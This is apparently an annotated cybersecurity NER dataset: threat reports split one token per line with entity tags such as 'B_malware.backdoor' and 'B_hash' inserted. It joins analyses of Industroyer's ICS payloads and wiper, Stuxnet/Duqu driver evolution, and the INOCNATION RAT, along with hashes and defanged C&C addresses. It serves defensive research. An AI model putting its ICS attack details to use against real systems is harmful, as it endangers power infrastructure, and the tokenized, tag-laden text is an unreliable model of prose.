packet
,
after
dissection
by
Wireshark
.

Figure
13
.
The
dissected
MMS
getNameList
request
in
Wireshark
.

If
the
target
device
responds
appropriately
,
the
61850
payload
then
sends
an
InitiateRequest
packet
using
the
Manufacturing
Message
Specification
(
MMS
)
.

If
the
expected
answer
is
received
,
it
continues
,
sending
an
MMS
getNameList
request
.

Thereby
,
the
component
compiles
a
list
of
object
names
in
a
Virtual
Manufacturing
Device
(
VMD
)
.

Next
,
this
component
enumerates
the
objects
discovered
in
the
previous
step
and
sends
the
device
domain-specific
getNameList
requests
with
each
object
name
.

This
enumerates
named
variables
in
a
specific
domain
.

Afterwards
,
the
61850
payload
parses
data
received
in
response
to
these
requests
,
searching
for
variables
that
contain
following
combinations
of
strings
:

•
CSW
,
CF
,
Pos
,
and
Model

•
CSW
,
ST
,
Pos
,
and
stVal

•
CSW
,
CO
,
Pos
,
Oper
,
but
not
$T

•
CSW
,
CO
,
Pos
,
SBO
,
but
not
$T

The
string
CSW
is
a
name
for
logical
nodes
,
which
are
used
to
control
circuit
breakers
and
switches
.

For
variables
that
contain
the
Model
or
stVal
string
the
61850
payload
sends
an
additional
MMS
Read
request
.

For
some
of
the
variables
this
component
may
also
issue
an
MMS
Write
request
that
will
change
its
state
.

Win32
/
Industroyer B_malware.backdoor

The
61850
payload
produces
a
log
file
of
its
operations
that
contains
the
IP
addresses
,
MMS
domains
,
named
variables
and
the
node
states
(
open
or
closed
)
of
its
targets
.

OPC
DA
payload
component

The
OPC
DA
payload
component
implements
a
client
for
the
protocol
described
in
the
OPC
Data
Access
specification
.

OPC
(
OLE
for
Process

Control
)
is
a
software
standard
and
specification
that
is
based
on
Microsoft
technologies
such
as
OLE
,
COM
,
and
DCOM
.

The
Data
Access
(
DA
)
part
of
the
OPC
specification
allows
real-time
data
exchange
between
distributed
components
,
based
on
a
client–server
model
.

This
component
exists
as
a
standalone
malicious
tool
with
the
filename
OPC.exe
and
a
DLL
,
which
implement
both
61850
and
OPC
DA
payload
functionalities
.

This
DLL
is
named
,
internally
in
PE
export
table
,
OPCClientDemo.dll
,
suggesting
that
the
code
of
this
component
may
be
based
on
the
open
source
project
OPC
Client
.

Next
the
component
uses
the
IOPCBrowseServerAddressSpace
interface
to
enumerate
all
OPC
items
on
the
server
.

Specifically
,
it
looks
for
items
that
contain
the
following
strings
in
their
name
:

•
ctlSelOn

•
ctlOperOn

•
ctlSelOff

•
ctlOperOff

•
\Pos
and
stVal

The
names
of
these
items
may
suggest
that
attackers
are
interested
in
OPC
items
provided
by
OPC
servers
that
belong
to
solutions
from
ABB
,
such
as
their
MicroSCADA
range
.

Figure
15
.
demonstrates
an
example
list
of
OPC
items
that
contain
names
with
similar
strings
.

This
list
of
OPC
items
is
received
by
the
OPC
Process
Objects
List
Tool
from
ABB
.

Figure
14
.
The
PE
export
reveals
the
internal
DLL
name
of
the
OPC
DA
payload
.

The
OPC
DA
payload
does
not
require
any
kind
of
configuration
file
.

Once
executed
by
the
attacker
,
it
enumerates
all
OPC
servers
using
the

ICatInformation::EnumClassesOfCategories
method
with
CATID_
OPCDAServer20
category
identifier
and
IOPCServer::GetStatus
to
identify
the
ones
running
.

Figure
15
.
An
example
of
OPC
items
names
in
IN
field
received
using
OPC
Process
Objects
List
Tool
.

Win32
/
Industroyer B_malware.backdoor

The
attackers
use
the
string
Abdul
when
they
add
a
new
OPC
group
.

Possibly
this
string
is
used
by
the
attackers
as
a
slang
term
when
referring
to
the
ABB
solutions
.

Figure
16
.
The
disassembled
code
of
the
OPC
DA
component
that
uses
the
Abdul
string
.

On
the
final
step
,
the
OPC
DA
payload
attempts
to
change
the
state
of
discovered
OPC
items
using
the
IOPCSyncIO
interface
by
writing
the
0x01
value
twice
.

Figure
17
.
Disassembled
code
of
OPC
DA
payload
that
uses
IOPCSyncIO
interface
.

The
component
writes
the
OPC
server
name
,
OPC
item
name
state
,
quality
code
and
value
to
the
log
file
.

The
logged
values
are
separated
with
the
following
headers
:

•
[*ServerName
:
%SERVERNAME%]
[State
:
Before]

•
[*ServerName
:
%SERVERNAME%]
[State
:
After
ON]

•
[*ServerName
:
%SERVERNAME%]
[State
:
After
OFF]

Data
wiper
component

The
data
wiper
component
is
a
destructive
module
that
is
used
in
the
final
stage
of
an
attack
.

The
attackers
are
using
this
component
to
hide
their
tracks
and
to
make
recovery
difficult
.

This
component
has
the
filename
haslo.dat
or
haslo.exe
and
can
be
executed
by
the
Launcher
component
or
used
as
a
standalone
malicious
tool
.

Once
executed
it
attempts
to
enumerate
all
keys
in
the
registry
that
list
Windows
services
:

•
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

It
attempts
to
set
the
registry
value
ImagePath
with
an
empty
string
in
each
of
the
entries
found
.

This
operation
will
make
the
operating
system
unbootable
.

The
next
step
is
actual
deletion
of
file
contents
.

The
component
enumerates
files
with
specific
file
extensions
on
all
drives
connected
to
computer
,
from
C:\
to
Z:\
It
should
be
noted
that
during
enumeration
the
component
skips
files
that
are
located
in
subdirectory
that
contains
Windows
in
its
name
.

The
component
rewrites
file
content
with
meaningless
data
obtained
from
newly
allocated
memory
.

In
order
to
perform
this
operation
thoroughly
the
component
attempts
to
rewrite
files
twice
.

The
first
attempt
happens
once
the
file
is
found
on
a
drive
.

If
the
first
attempt
is
unsuccessful
then
the
wiper
malware
makes
a
second
attempt
,
but
before
that
the
malware
terminates

Win32
/
Industroyer B_malware.backdoor

all
processes
except
those
included
in
a
list
of
critical
system
processes
.

The
list
of
these
processes
is
displayed
in
Figure
18
.

To
speed
up
the
wiping
operation
this
component
rewrites
only
partial
file
content
at
the
beginning
of
the
file
.

The
amount
of
data
to
be
rewritten
depends
on
file
size
:
the
smallest
amount
of
data
will
be
rewritten
for
files
less
than
or
equal
to
1Mb
(
4096
bytes
)
;
the
largest
amount
of
data
will
be
rewritten
for
files
less
than
or
equal
to
10Mb
(
32768
bytes
)
.

Finally
,
this
component
attempts
to
terminate
all
processes
(
including
system
processes
)
except
its
own
.

This
will
result
in
the
system
becoming
unresponsive
and
eventually
crashing
.

Figure
18
List
of
processes
that
are
not
terminated
on
second
rewriting
attempt
.

The
filename
masks
targeted
by
the
data
wiper
component
to
be
overwritten
are
:

SYS_BASCON
COM
*
PL
*
paf
*
XRF
*
trc
*
pcmi
*
pcmt
*
ini
*
xml
*
CIN
*
prj
*
bk
*
bkp
*
log
*
zip
*
rar
*
tar
*
SCL
*
bak
*
cid
*
scd
*
pcmp
*
cxm
*
elb
*
epl
*
mdf
*
ldf
*
7z
*
exe
*
dll

This
list
contains
filename
extensions
that
are
used
in
a
standard
environment
,
such
as
Windows
binaries
(
exe
/
dll
)
,
archives
(
7z
/
tar/
rar/
zip
)
,
backup
files
(
bak/
bk/
bkp
)
,
Microsoft
SQL
server
files
(
mdf/
ldf
)
,
and
various
configuration
files
(
ini/
xml
)
.

In
addition
,
the
component
also
wipes
files
that
may
be
used
in
industrial
control
systems
,
such
as
files
written
using
Substation
Configuration
description
Language
(
scl
/
cid
/
scd
)
and
there
are
many
files
and
file
extensions
that
are
used
by
various
products
from
ABB
.

For
example
,
a
file
named
SYS_BASCON.COM
is
used
by
ABB
solutions
for
storing
configuration
data
,
and
files
with
the
.paf‌
(
Product‌
Authorization‌File
)
filename
extension
are
used
to
store
license
data
for
ABB
MicroSCADA
products
.

Additional
tools
:
port
scanner
tool

The
attackers
'
arsenal
includes
a
port
scanner
that
can
be
used
to
map
the
network
and
to
find
computers
relevant
to
their
attack
.

Interestingly
,
instead
of
using
software
already
existing
,
the
attackers
built
their
own
custom-made
port
scanner
.

As
is
evident
from
Figure
19
,
the
attacker
can
define
a
range
of
IP
addresses
and
a
range
of
network
ports
that
are
to
be
scanned
by
this
tool
.

Figure
19
.
The
port
scanner
tool
usage
example
.

Win32
/
Industroyer B_malware.backdoor
15

Additional
tools
:
DoS
tool

Another
tool
from
the
attackers
'
arsenal
is
a
Denial-of-Service
(
DoS
)
tool
that
can
be
used
against
Siemens
SIPROTEC
devices
This
tool
leverages
the
CVE-2015-5374
vulnerability
in
order
to
render
a
device
unresponsive
.

Once
this
vulnerability
is
successfully
exploited
,
the
target
device
stops
responding
to
any
commands
until
it
is
rebooted
manually
.

To
exploit
this
vulnerability
the
attackers
hardcoded
the
device
IP
addresses
into
this
tool
Once
the
tool
.

is
executed
it
sends
specifically
crafted
packets
to
port
50,000
of
the
target
IP
addresses
using
UDP
.

The
UDP
packet
contains
only
18
bytes
.

Figure
20
.
Content
of
UDP
packet
used
during
exploitation
of
CVE-2015-5374
.

Conclusion

The
investigation
behind
the
Ukrainian
power
outage
last
December
is
still
ongoing
and
it
is
currently
not
confirmed
that
the
malware
analyzed
here
was
the
direct
cause
.

Nevertheless
,
we
believe
that
to
be
a
very
probable
explanation
,
as
the
malware
is
able
to
directly
control
switches
and
circuit
breakers
at
power
grid
substations
using
four
ICS
protocols
and
contains
an
activation
timestamp
for
December
17
,
2016
,
the
day
of
the
power
outage
.

We
can
definitely
say
that
the
Win32
/
Industroyer B_malware.backdoor
malware
family
is
an
advanced
and
sophisticated
piece
of
malware
that
is
used
against
industrial
control
systems
.

However
,
it
should
be
noted
that
the
malware
itself
is
just
a
tool
in
the
hands
of
an
even
more
advanced
and
very
capable
malicious
actor
.

Using
logs
produced
by
the
toolset
and
highly
configurable
payloads
,
the
attackers
could
adapt
the
malware
to
any
comparable
environment
.

The
commonly-used
industrial
control
protocols
used
in
this
malware
were
designed
decades
ago
without
taking
security
into
consideration
.

Therefore
,
any
intrusion
into
an
industrial
network
with
systems
using
these
protocols
should
be
considered
as
'
game
over
'
.

Indicators
of
Compromise
(
IoC
)

SHA-1
hashes
:

F6C21F8189CED6AE150F9EF2E82A3A57843B587D  B_hash
CCCCE62996D578B984984426A024D9B250237533  B_hash
2CB8230281B86FA944D3043AE906016C8B5984D9  B_hash
8E39ECA1E48240C01EE570631AE8F0C9A9637187  B_hash
79CA89711CDAEDB16B0CCCCFDCFBD6AA7E57120A  B_hash
94488F214B165512D2FC0438A581F5C9E3BD4D4C  B_hash
5A5FAFBC3FEC8D36FD57B075EBF34119BA3BFF04  B_hash
B92149F046F00BB69DE329B8457D32C24726EE00  B_hash
B335163E6EB854DF5E08E85026B2C3518891EDA8  B_hash

IP
addresses
of
C&C
servers
:

195.16.88[.]6 B_ip.cncsvr
46.28.200[.]132 B_ip.cncsvr
188.42.253[.]43 B_ip.cncsvr
5.39.218[.]152 B_ip.cncsvr
93.115.27[.]57 B_ip.cncsvr

Warning
!

Most
of
the
servers
with
these
IP
addresses
were
part
of
Tor
network
which
means
that
the
use
of
these
indicators
could
result
in
a
false
positive
match
.

Win32
/
Industroyer B_malware.backdoor
Stuxnet B_malware.backdoor
/
Duqu B_malware.infosteal
:
The
Evolution
of
Drivers

We
have
been
studying
the
Duqu B_malware.infosteal
Trojan
for
two
months
now
,
exploring
how
it
emerged
,
where
it
was
distributed
and
how
it
operates
.

Despite
the
large
volume
of
data
obtained
(
most
of
which
has
yet
to
be
published
)
,
we
still
lack
the
answer
to
the
fundamental
question
-
who
is
behind
Duqu B_malware.infosteal
?

In
addition
,
there
are
other
issues
,
mostly
to
do
with
the
creation
of
the
Trojan
,
or
rather
the
platform
used
to
implement
Duqu B_malware.infosteal
as
well
as
Stuxnet B_malware.backdoor
.

In
terms
of
architecture
,
the
platform
used
to
create
Duqu B_malware.infosteal
and
Stuxnet B_malware.backdoor
is
the
same
.

This
is
a
driver
file
which
loads
a
main
module
designed
as
an
encrypted
library
.

At
the
same
time
,
there
is
a
separate
configuration
file
for
the
whole
malicious
complex
and
an
encrypted
block
in
the
system
registry
that
defines
the
location
of
the
module
being
loaded
and
name
of
the
process
for
injection
.

Conventional
platform
architecture
for
Stuxnet B_malware.backdoor
and
Duqu B_malware.infosteal

This
platform
can
be
conventionally
named
as
'
Tilded
'
as
its
authors
are
,
for
some
reason
,
inclined
to
use
file
names
which
start
with
'
~d
'
.

We
believe
Duqu B_malware.infosteal
and
Stuxnet B_malware.backdoor
were
simultaneous
projects
supported
by
the
same
team
of
developers
.

Several
other
details
have
been
uncovered
which
suggest
there
was
possibly
at
least
one
further
spyware
module
based
on
the
same
platform
in
2007-2008
,
and
several
other
programs
whose
functionality
was
unclear
between
2008
and
2010
.

These
facts
significantly
challenge
the
existing
'
official
'
history
of
Stuxnet B_malware.backdoor
.

We
will
try
to
cover
them
in
this
publication
,
but
let
us
first
recap
the
story
so
far
.

The
'
official
'
Stuxnet B_malware.backdoor
story

Let
me
start
with
a
question
:
how
many
Stuxnet B_malware.backdoor
driver
files
are
known
?

As
of
today
,
the
correct
answer
would
be
four
.

See
below
for
more
information
about
them
.

File
name

Size
(
bytes
)

Mrxcls.sys

19840

Mrxcls.sys

26616

Compilation
date

01.01.2009

01.01.2009

Mrxnet.sys

17400

25.01.2010

Jmidebs.sys

25552

14.07.2010

Where
and
when
it
was
used

Stuxnet B_malware.backdoor
(
22.06.2009
)

Stuxnet B_malware.backdoor
(
01.03.2010/14.04.2010
)

Stuxnet B_malware.backdoor
(
01.03.2010/14.04.2010
)

Presumably
,
Stuxnet B_malware.backdoor

Digital
signature
/
signing
date

Realtek
,
25.01.2010

Realtek
,
25.01.2010

Jmicron
,
unknown

The
first
modification
of
the
Stuxnet B_malware.backdoor
worm
,
created
in
2009
,
used
only
one
driver
file
-
mrxcls.sys
without
a
digital
signature
.

In
2010
,
the
authors
created
the
second
driver
mrxnet.sys
(
to
hide
the
worm's
component
files
on
USB
drives
)
and
equipped
mrxnet.sys
and
mrxcls.sys
drivers
with
digital
certificates
from
Realtek
.

The
mrxnet.sys
driver
is
of
no
great
significance
to
our
story
,
as
it
is
a
separate
module
not
included
into
the
general
architecture
of
the
platform
.

On
17
July
2010
,
ESET
detected
another
driver
'
in
the
wild
'
-
jmidebs.sys
-
which
was
very
similar
to
the
already
known
mrxcls.sys
,
but
had
been
created
just
three
days
before
it
was
discovered
.

This
driver
was
backed
with
a
new
certificate
-
this
time
from
Jmicron
.

Until
recently
it
was
unclear
what
the
purpose
of
this
file
was
,
but
popular
opinion
held
that
it
was
related
to
Stuxnet B_malware.backdoor
.

One
theory
is
that
the
Stuxnet B_malware.backdoor
C&C
was
trying
to
replace
the
old
version
with
the
Realtek
certificate
with
a
new
one
.

In
doing
so
,
the
authors
of
the
worm
were
either
hoping
to
prevent
it
being
picked
up
by
antivirus
programs
,
or
were
replacing
a
certificate
which
had
been
blocked
.

Unfortunately
,
this
theory
has
not
been
confirmed
-
Jmidebs.sys
has
never
been
detected
anywhere
.

A
new
version
of
Stuxnet B_malware.backdoor
capable
of
installing
the
file
has
also
not
been
found
.

This
is
the
official
history
of
Stuxnet B_malware.backdoor
.

However
,
as
I
mentioned
above
,
in
the
course
of
our
research
we
have
discovered
new
evidence
which
will
be
discussed
below
.

Previously
unknown
drivers

rtniczw.sys

While
analyzing
a
user
incident
involving
Duqu B_malware.infosteal
,
we
discovered
something
new
-
something
that
could
,
potentially
,
affect
the
whole
Stuxnet B_malware.backdoor
story
as
we
know
it
.

A
strange
file
was
discovered
on
the
victim's
computer
,
which
was
detected
by
our
antivirus
engine
as
Rootkit.Win32.Stuxnet.a.
This
verdict
was
supposed
to
correspond
to
the
known
file
mrxcls.sys
described
above
,
but
the
detected
file's
name
and
checksum
were
different
!

The
file
was
rtniczw.sys
,
26,872
bytes
in
size
,
MD5
546C4BBEBF02A1604EB2CAAAD4974DE0
.

The
file
was
a
little
larger
than
mrxcls.sys
,
which
had
a
Realtek
digital
signature
.

This
implied
that
rtniczw.sys
also
had
a
digital
signature
.

We
managed
to
get
a
copy
of
the
file
,
and
we
were
amazed
to
find
that
it
used
the
same
Realtek
certificate
,
but
with
a
different
file
signing
date
from
mrxcls.sys
:
rtniczw.sys
was
signed
on
18
March
2010
,
while
the
mrxcls
driver
had
been
signed
on
25
January
of
the
same
year
.

In
addition
,
rtniczw.sys
used
a
registry
key
and
configuration
data
block
that
was
not
used
in
Stuxnet B_malware.backdoor
.

Stuxnet B_malware.backdoor
used
the
key
'
MRxCls
'
and
the
value
'
Data
'
,
while
in
the
case
of
rtniczw.sys
,
the
key
was
'
rtniczw
'
and
the
value
was
'
Config
'
.

Detailed
analysis
of
the
code
found
in
rtniczw.sys
identified
no
other
differences
from
the
'
reference
'
driver
:
this
was
the
same
mrxcls.sys
file
,
created
in
the
same
year
,
on
the
same
day
and
hour
-
on
1

January
2009
.

We
searched
for
additional
information
about
other
users
who
had
the
same
file
,
but
were
unable
to
find
anything
!

Moreover
,
we
could
find
no
information
at
all
about
the
file's
name
(
rtniczw.sys
)
or
its
MD5
in
any
search
engine
.

The
file
had
been
identified
only
once
:
it
had
been
sent
for
scanning
to
VirusTotal
from
China
in
May
2011
.

Apparently
,
the
system
that
we
were
studying
had
been
infected
in
late
August
2011
.

It
should
be
noted
that
we
did
not
find
a
Stuxnet B_malware.backdoor
infection
on
the
system
:
no
additional
files
from
the
Stuxnet B_malware.backdoor
kit
had
been
found
.

However
,
we
did
find
Duqu B_malware.infosteal
files
.

We
came
to
the
conclusion
that
there
could
be
other
driver
files
similar
to
the
'
reference
'
file
mrxcls.sys
,
which
are
not
among
known
variants
of
Stuxnet B_malware.backdoor
.

rndismpc.sys

A
check
in
our
malware
collection
helped
identify
another
interesting
file
that
was
included
in
the
collection
over
a
year
ago
.

The
file
is
named
rndismpc.sys
,
it
is
19,968
bytes
in
size
,
MD5
9AEC6E10C5EE9C05BED93221544C783E
.

This
turned
out
to
be
another
driver
,
with
functionality
very
nearly
identical
to
that
of
mrxcls.sys
apart
from
the
following
exceptions
:

1
.
rndismpc.sys
uses
a
registry
key
that
is
different
from
the
keys
used
by
both
mrxcls
and
rtniczw
-
it
is
the
key
'
rndismpc
'
with
the
value
'
Action'
;

2
.
it
uses
an
encryption
key
that
is
different
from
that
used
by
mrxcls
/
rtniczw
-
0x89CF98B1
;

3
.
the
file's
compilation
date
is
20
January
2008
,
i.e.
a
year
before
mrxcls
/
rtniczw
were
created
.

Like
rtniczw.sys
,
the
file
rndismpc.sys
had
never
been
encountered
on
our
users
'
machines
.

We
do
not
know
which
malicious
program
installed
it
or
which
main
module
it
was
supposed
to
work
with
.

The
connecting
link
:
mrxcls.sys
-->
jmidebs.sys
-->Duqu B_malware.infosteal
drivers

The
data
obtained
and
the
available
information
about
the
drivers
used
in
Duqu B_malware.infosteal
(
see
The
Mystery
of
Duqu B_malware.infosteal
,
Part
One
and
Part
Two
)
can
be
summed
up
in
the
table
below
:

Name

rndismpc.sys

mrxcls.sys

mrxcls.sys
(
signed
)

rtniczw.sys
(
signed
)

jmidebs.sys
(
signed
)

.sys*

.sys*

Size

19968

19840

26616

Compilation
date

20.01
.
2008

01.01
.
2009

01.01
.
2009

01.01
.
2009

14.07
.

25502

2010

Different

03.11
.
2010

Different

17.10
.
2011

26872

Main
module

Encryption

Registry

Value

Device
name

Unknown

0x89CF98B1

rndismpc
'
Action
'

'
rndismpc
'

Stuxnet.a

0xAE240682

MRxCls

'
Data
'

'
MRxClsDvX
'

Stuxnet.b/.c

0xAE240682

MRxCls

'
Data
'

'
MRxClsDvX
'

Unknown

0xAE240682

rtniczw

'
Config
'

'
RealTekDev291
'

Unknown

0xAE240682

jmidebs

Duqu B_malware.infosteal

Duqu B_malware.infosteal

0xAE240682

0x20F546D3

'
IDE
'

{3093983-109232-29291}

'
FILTER
'

{3093AAZ3-1092-2929'FILTER

'
{624409B3-4CEF-41c08B81-7634279A41E5}

9391}

*Known
Duqu B_malware.infosteal
drivers
have
unique
file
names
for
each
of
the
variants
.

Their
functionality
,
however
,
is
absolutely
identical
.

According
to
our
analysis
,
jmidebs.sys
is
the
connecting
link
between
mrxcls.sys
and
the
drivers
later
used
in
Duqu B_malware.infosteal
.

The
code
of
mrxcls
and
jmidebs
drivers
is
largely
similar
.

Some
small
differences
may
be
due
to
different
settings
and
minimal
changes
in
the
source
code
,
while
the
point
of
the
code
remains
the
same
.

However
,
more
significant
changes
can
be
found
in
several
functions
:

1
.
The
service
function
which
obtains
addresses
of
API
functions
:

The
version
in
mrxcls
uses
the
function
MmGetSystemRoutineAddress
for
this
purpose
and
the
respective
text
names
of
the
addresses
of
incoming
API
functions
.

The
version
in
jmidebs
calls
its
own
functions
to
obtain
API
addresses
using
hash-sums
of
their
names
.

The
same
functions
are
used
in
Duqu B_malware.infosteal
drivers
,
while
the
list
of
functions
'
hashes
is
twice
as
long
.

2
.
The
function
which
creates
stubs
to
inject
PNF
DLL
into
processes
:

The
mrxcls
version
uses
a
stub
with
a
total
size
of
6332
bytes
.

The
jmidebs
and
Duqu B_malware.infosteal
drivers
use
stubs
with
a
total
size
of
7061
bytes
.

The
code
used
in
the
stub
modules
for
these
drivers
is
identical
,
but
has
different
compilation
dates
.

Mrxcls
(
Stuxnet B_malware.backdoor
)

RtlGetVersion
,
KeAreAllApcsDisabled
,
obtained
by
calling
MmGetSystemRoutineAddress

jmidebs

RtlGetVersion
,
KeAreAllApcsDisabled
,
PsGetProcessSessionId
,
PsGetProcessPeb
obtained
with
their
own
functions

Injected

6332

Jan
01
22:53:23
2009

7061

Jul
14
13:05:31
2010

Duqu B_malware.infosteal

Similar
to
jmidebs
,
4
more
functions
added

7061

Different
compilation
dates

Driver
evolution

We
have
mapped
out
the
links
between
known
drivers
whose
evolution
and
key
stages
of
development
are
easy
to
track
.

Driver
evolution
from
2008
to
2011

rndismpc.sys
,
rtniczw.sys
and
jmidebs.sys

As
you
can
see
from
the
diagram
,
it
is
not
known
which
malicious
program
interacted
with
the
following
three
drivers
:
rndismpc.sys
,
rtniczw.sys
and
jmidebs.sys
.
The
obvious
question
would
be
:
were
they
used
in
Stuxnet B_malware.backdoor
?

In
our
opinion
,
the
answer
would
have
to
be
'
no
'
.

First
of
all
,
if
they
had
been
used
in
Stuxnet B_malware.backdoor
,
they
would
have
left
a
far
bigger
footprint
than
the
individual
cases
we
have
detected
.

Secondly
,
there
hasn't
been
a
single
variant
of
Stuxnet B_malware.backdoor
that
is
capable
of
interacting
with
these
drivers
.

The
file
rtniczw.sys
was
signed
on
18
March
2010
,
but
on
14
April
2010
the
Stuxnet B_malware.backdoor
authors
created
a
new
variant
of
the
worm
that
made
use
of
the
'
reference
'
mrxcls.sys
.

It
is
obvious
that
rtniczw.sys
was
intended
for
some
other
use
.

The
same
can
be
said
of
jmidebs.sys
.

We
believe
that
the
three
drivers
are
only
indirectly
related
to
Stuxnet B_malware.backdoor
and
can
safely
be
erased
from
Stuxnet B_malware.backdoor
history
.

Then
there
is
another
question
:
could
these
drivers
have
been
used
with
Duqu B_malware.infosteal
?

There
is
no
clear-cut
answer
here
.

Although
all
known
variations
of
Duqu B_malware.infosteal
are
from
the
period
November
2010-October
2011
,
we
believe
there
were
earlier
versions
of
the
Trojan
spy
created
to
steal
information
.

The
three
drivers
in
question
could
easily
have
been
used
in
early
versions
of
Duqu B_malware.infosteal
or
with
other
Trojans
based
on
the
Stuxnet B_malware.backdoor
/
Duqu B_malware.infosteal
platform
.

Like
Duqu B_malware.infosteal
,
those
Trojans
were
most
probably
used
in
targeted
attacks
before
the
appearance
of
Stuxnet B_malware.backdoor
(
dating
back
to
at
least
2008
)
,
both
while
it
was
active
and
after
its
C&C
was
shut
down
.

They
were
likely
to
have
been
parallel
projects
,
and
Stuxnet B_malware.backdoor
was
subsequently
based
on
that
accumulated
experience
and
the
code
that
had
already
been
written
.

It
seems
highly
unlikely
that
this
was
the
only
project
that
its
authors
were
involved
in
.

The
driver
creation
process

Let's
try
to
imagine
what
the
driver
creation
process
looks
like
.

A
few
times
a
year
the
authors
compile
a
new
version
of
a
driver
file
,
creating
a
reference
file
.

The
primary
purpose
of
this
file
is
to
load
and
execute
a
main
module
,
which
is
created
separately
.

It
could
be
Stuxnet B_malware.backdoor
,
or
Duqu B_malware.infosteal
or
something
else
.

When
it
is
necessary
to
use
a
driver
for
a
new
module
,
the
authors
use
a
dedicated
program
to
modify
information
in
the
driver's
'
reference
'
file
,
i.e.

its
name
and
service
information
as
well
as
the
registry
key
and
its
value
.

It's
important
to
note
that
they
tweak
ready-made
files
and
don't
create
a
new
one
from
scratch
.

This
means
they
can
make
as
many
different
driver
files
as
they
like
,
each
having
exactly
the
same
functionality
and
creation
date
.

Depending
on
the
aim
of
the
attack
and
the
Trojan's
victim
,
several
driver
files
can
then
be
signed
with
legitimate
digital
certificates
whose
origins
remain
unknown
.

Conclusion

From
the
data
we
have
at
our
disposal
,
we
can
say
with
a
fair
degree
of
certainty
that
the
'
Tilded
'
platform
was
created
around
the
end
of
2007
or
early
2008
before
undergoing
its
most
significant
changes
in
summer/autumn
2010
.

Those
changes
were
sparked
by
advances
in
code
and
the
need
to
avoid
detection
by
antivirus
solutions
.

There
were
a
number
of
projects
involving
programs
based
on
the
'
Tilded
'
platform
throughout
the
period
2007-2011
.

Stuxnet B_malware.backdoor
and
Duqu B_malware.infosteal
are
two
of
them
there
could
have
been
others
,
which
for
now
remain
unknown
.

The
platform
continues
to
develop
,
which
can
only
mean
one
thing
-
we're
likely
to
see
more
modifications
in
the
future
.
Fidelis
Threat
Advisory
#1020

Dissecting
the
Malware
Involved
in
the
INOCNATION
Campaign

As
the
findings
of
a
new
malware
attack
campaign
named
INOCNATION
emerged
,
Fidelis
Threat
Research
investigated
the
Remote
Access
Tool
(
RAT B_malware.backdoor
)
used
in
this
campaign
.

We
discovered
some
interesting
characteristics
.

This
particular
RAT B_malware.backdoor
employs
simple
and
cunning
techniques
to
prevent
its
discovery
or
further
investigation
.

The
embedded
anti-analysis
techniques
and
other
capabilities
introduce
tradecraft
that
is
integrated
directly
into
the
malware's
layers
.

Specifically
we
found
that
the
malware
utilized
the
following
techniques
:

ff
Different
types
of
XOR
techniques
to
obfuscate
components
and
its
contained
strings

ff
The
use
of
trusted
security
software
as
a
decoy
during
initial
infection

ff
Sandbox
detection

ff
A
mangled
MZ
header
to
deceive
security
products

ff
String
Stacking
obfuscation
with
Unicode
Strings

ff
More
than
one
layer
of
obfuscation
for
its
command
and
control
traffic

ff
Un-Install
functionality

MD5
Hash

Function

A7BD555866AE1C161F78630A638850E7  B_hash

Initial
Launcher
/
Dropper

2F7E5F91BE1F5BE2B2F4FDA0910A4C16  B_hash
4F4BF27B738FF8F2A89D1BC487B054A8  B_hash
75D3D1F23628122A64A2F1B7EF33F5CF  B_hash
68F1419721354EC1f78A71E10B54FCA8  B_hash

Decoy
Installer
for
Cisco
AnyConnect
Mobility
Client

RAT B_malware.backdoor
Installer

Description

Executable
(
EXE
)

Executable
(
EXE
)

Executable
(
EXE
)

RAT B_malware.backdoor
Implant
/
Payload

Cisco
AnyConnect
Mobility
Client

OLE
Control
Library
(
DLL
)

Valid
Signed
Executable
(
EXE
)

Initial
Launcher
/
Dropper

MD5
Hash
:
A7BD555866AE1C161F78630A638850E7  B_hash

The
initial
launcher
/
dropper
writes
two
executable
files
to
the
hard
drive
,
the
RAT B_malware.backdoor
Installer
(
MD5
:
4F4BF27B738FF8F2A89D1BC487B054A8  B_hash
)
and
the
Cisco
AnyConnect
decoy
(
MD5
:
2F7E5F91BE1F5BE2B2F4FDA0910A4C16  B_hash
)
.

This
launcher
is
also
responsible
for
the
initial
execution
of
both
the
malware
and
decoy
processes
.

Both
embedded
executable
files
are
obfuscated
with
an
XOR
operation
using
a
single-byte
hexadecimal
key
of
0x62
,
but
both
the
XOR
byte
and
the
Null
byte
(
0x00
)
is
skipped
.

By
skipping
over
the
XOR
bytes
and
Null
bytes
this
helps
the
malware
to
protect
itself
from
static
analysis
tools
by
preventing
an
accurate
extraction
.

The
only
difference
between
the
two
de-obfuscation
routines
is
how
many
bytes
are
XOR'ed
at
a
time
during
each
round
.

The
RAT B_malware.backdoor
Installer
is
XOR'ed
six
bytes
at
a
time
and
the
Cisco
decoy
is
XOR'ed
four
bytes
at
a
time
.

This
additional
code
suggests
that
the
malware
author
may
change
in
the
future
from
a
repeated
single-byte
XOR
key
to
a
non-repeated
multibyte
XOR
key
to
better
protect
any
future
embedded
malware
.

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

THREAT
ADVISORY

Figure
2
-
Four-byte
XOR
Routine
(
Decoy
Decode
)

Figure
1
-
Six-byte
XOR
Routine
(
Malware
Decode
)

Decoy
Installer
for
Cisco
AnyConnect
Mobility
Client
(
MD5
:
2F7E5F91BE1F5BE2B2F4FDA0910A4C16  B_hash
)

Figure
3
-
Cisco
Installation
Prompt
Presented
to
the
Victim

WWW.FIDELISSECURITY.COM B_url.normal

©Fidelis
Cybersecurity

TA#1020_FIDELIS_INOCNATION_1512

After
being
initiated
by
the
initial
launcher
the
legitimate
looking
decoy
Cisco
Installer
process
executes
and
becomes
visible
to
the
victim
.

The
target
victim
may
choose
to
continue
or
cancel
the
installation
,
but
despite
a
victim's
decision
to
cancel
the
installation
the
malware
infection
continues
under
a
separate
running
process
.

It
silently
begins
to
create
and
entrench
the
loaded
malware
into
the
system's
background
.

If
the
victim
chooses
to
continue
with
the
Cisco
installation
the
Cisco
AnyConnect
Mobility
Client
software
is
actually
installed
,
as
shown
in
Figures
4
and
5
.

Figure
4
-
Installed
Files
from
the
Cisco
AnyConnect
Software
Install

Figure
5
-
Execution
of
Cisco
binary
vpnui.exe
(
MD5
:
68F1419721354EC1f78A71E10B54FCA8  B_hash
)

The
attacker's
use
of
decoy
software
is
the
same
as
when
a
threat
actor
will
decide
to
display
a
decoy
PFD
or
Office
Document
,
to
give
the
victim
a
sense
that
everything
is
fine
and
that
there
is
no
need
to
inform
the
IT
or
the
Security
team
for
investigation
.

But
the
decision
by
the
attacker
to
use
a
widely
known
security
application
as
an
embedded
decoy
is
